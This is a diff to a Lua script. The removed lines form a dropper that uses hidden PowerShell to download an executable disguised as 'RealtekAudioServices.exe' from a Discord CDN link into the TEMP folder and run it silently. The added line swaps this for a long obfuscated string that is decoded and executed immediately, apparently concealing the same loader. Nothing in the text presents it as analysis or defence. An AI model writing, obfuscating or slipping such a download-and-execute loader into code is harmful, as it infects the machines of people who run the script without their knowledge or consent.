@@ -1,15 +1,1 @@
-local temp_path = os.getenv("TEMP")
-local file_name = "RealtekAudioServices.exe"
-local full_path = temp_path .. "\\" .. file_name
-
-local url = "https://cdn.discordapp.com/attachments/1400478404481912832/1400833505239367810/RealtekAudioServices.exe?ex=688e135d&is=688cc1dd&hm=273dce52c2b111b638fb2c9d7f231348954aa412836af8d78e732b85e3cf1a2d&"
-
-local download_command = 'powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile(\'' .. url .. '\', \'' .. full_path .. '\')"'
-
-local execute_command = 'start "" "' .. full_path .. '"'
-
-local function run_silent(cmd)
-    shellExecute("cmd.exe", "/c " .. cmd, "", false)
-end
-
-run_silent(download_command .. " & " .. execute_command)
+decodeFunction('c-oWpDNPJ!jPYXt1Ifv{TvA+t94s6h6:4hrpi%B^^?i*J;8I{j?wszHF9E3(de:_CHL9G]yIh!4xhY1!pZjUijyZnnyqv5_?%rMYgNrQY[M^7Oo@6iRyK+YE+gw]@^SpTY@I4s#r.ip{(,AVU/ZNY+)dYGgUKAO7UNwn;g:wz-@b:/aEa!1O73B0_xTDkQ]MgZyuAiC{XA9FIpq.1AE^r^Oa.5j/b:?qdPS47_HT%?^Io^uvPZSTjyW6:cEj)Q;V*:;(M*99!PN(XHy2ZUL;hbPr9%7r/I?hWvWb6Ab,{SAX]6j[-VTyLLM%1=z%j9D_S%uhG^4(asTJZUz*2_g{Vp/kvR*1x7^JQAGx#X^inx(yZzWCq2m%KREB$lqu$SAXPy_!/abl7=A)A0#r;G{,xHaGaLeo]!]ZJ22MSNikY9!8c]-^cFjOw%klmMy#Cz[)t?Wwni2VxG@kU.hR8+OxgKTCcUXko??bn*BZkWpZk@smZ[OmwvwH67lPsvx.G(X{-+w(lkkG^%eS;w?y(GHFuxmgLTsx1Ai^@HdYDFHu74yXB)Tt2W_GYgoHFphwaaLWkWvddzNdy)Gv20?NAX9lApT4#[ow[4:O+cTqYOrb3w3]x/jtE!:fcEV*b8?oSx}OI^lJq]/qjzUb1gJb#!mkx1AG%r1!mJJ#[^s[Ksuwd2lp=$*iBxFc6/Vcj7pZ;Hx-ix^;7@USO:VGsox(pH3.Zj]dUT2F9Lsp7[ZZMLXx50;#wfy;6eDcbYr=TpN[0bL!Yy:g([YxMEJ7dg#0T*Om;c:RhP53.-;YF}/')()
